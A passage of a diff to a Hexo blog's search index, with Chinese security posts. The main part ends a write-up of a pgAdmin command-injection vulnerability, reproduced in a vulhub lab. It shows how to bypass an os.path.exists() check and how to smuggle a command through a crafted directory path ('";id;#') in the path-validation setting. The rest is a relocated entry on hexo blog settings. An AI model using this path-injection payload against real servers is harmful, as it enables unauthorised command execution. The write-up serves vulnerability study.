+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>信呼OA后台getshell分析</title>
@@ -3802,34 +3802,6 @@
       </tags>
   </entry>
   <entry>
-    <title>博客常用设置</title>
-    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
-    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
-<span id="more"></span>
-
-
-
-<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
-<h2 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h2><p>参考文章：<a href="https://blog.csdn.net/wang631106979/article/details/51375184">https://blog.csdn.net/wang631106979/article/details/51375184</a></p>
-<p>图片资源：<a href="https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/">https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/</a></p>
-<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>基于<strong>hexo+next</strong></p>
-<p>参考文章：<a href="https://blog.csdn.net/qq_21237971/article/details/108395258">https://blog.csdn.net/qq_21237971/article/details/108395258</a></p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-  </entry>
-  <entry>
     <title>建立共享获取敏感文件</title>
     <url>/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6.html</url>
     <content><![CDATA[<p>在本地测试并学习如何渗透过程中获取敏感文件</p>
@@ -3863,6 +3835,34 @@
       <tags>
         <tag>Windows</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客常用设置</title>
+    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
+    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
+<span id="more"></span>
+
+
+
+<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
+<h2 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h2><p>参考文章：<a href="https://blog.csdn.net/wang631106979/article/details/51375184">https://blog.csdn.net/wang631106979/article/details/51375184</a></p>
+<p>图片资源：<a href="https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/">https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/</a></p>
+<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>基于<strong>hexo+next</strong></p>
+<p>参考文章：<a href="https://blog.csdn.net/qq_21237971/article/details/108395258">https://blog.csdn.net/qq_21237971/article/details/108395258</a></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
   </entry>
   <entry>
     <title>红日靶场1</title>
